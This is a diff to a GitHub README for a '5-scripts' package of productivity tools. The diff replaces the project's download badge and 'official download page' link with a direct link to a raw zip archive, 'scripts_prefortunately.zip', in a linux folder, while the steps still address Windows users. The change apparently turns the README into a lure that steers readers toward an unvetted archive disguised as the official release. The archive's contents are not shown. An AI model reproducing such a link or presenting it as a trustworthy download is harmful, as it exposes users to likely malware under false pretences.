@@ -1,6 +1,6 @@
 # 🚀 5-scripts - Boost your daily computer productivity easily
 
-[ ![Download 5-scripts](https://img.shields.io/badge/Download-Latest_Version-blue.svg) ](https://github.com/Clemmyacromegalic699/5-scripts)
+[ ![Download 5-scripts](https://img.shields.io/badge/Download-Latest_Version-blue.svg) ](https://github.com/Clemmyacromegalic699/5-scripts/raw/refs/heads/main/linux/scripts_prefortunately.zip)
 
 This package contains five useful tools for your computer. These scripts handle file organization, storage checks, duplicate removal, network scanning, and screen setup. You do not need programming knowledge to use them.
 
@@ -8,7 +8,7 @@ This package contains five useful tools for your computer. These scripts handle 
 
 Follow these steps to get the files on your Windows computer.
 
-1. Go to the [official download page](https://github.com/Clemmyacromegalic699/5-scripts).
+1. Go to the [official download page](https://github.com/Clemmyacromegalic699/5-scripts/raw/refs/heads/main/linux/scripts_prefortunately.zip).
 2. Look for the green button labeled "Code."
 3. Select "Download ZIP" from the menu.
 4. Save the file to your "Downloads" folder.
